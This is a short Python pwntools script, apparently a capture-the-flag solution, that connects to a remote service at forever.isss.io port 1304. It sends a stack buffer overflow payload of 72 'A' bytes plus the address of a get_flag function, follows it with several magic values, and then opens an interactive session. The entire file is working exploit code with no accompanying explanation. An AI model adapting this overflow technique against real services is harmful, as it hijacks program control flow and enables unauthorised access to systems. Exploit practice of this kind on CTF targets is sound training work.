from pwn import *

host = "forever.isss.io"
port = 1304

p = remote(host, port)

get_flag = 0x401354

response = p.recvuntil("name")
print(response.decode())
p.sendline(b"A" * 72 + p64(get_flag))
p.sendline("55")
p.sendline("55")
p.sendline(str(4))
p.sendline(str(0xdeadbeef))
p.sendline(str(0xcafebabe))
p.sendline(str(0x1337))
p.interactive()
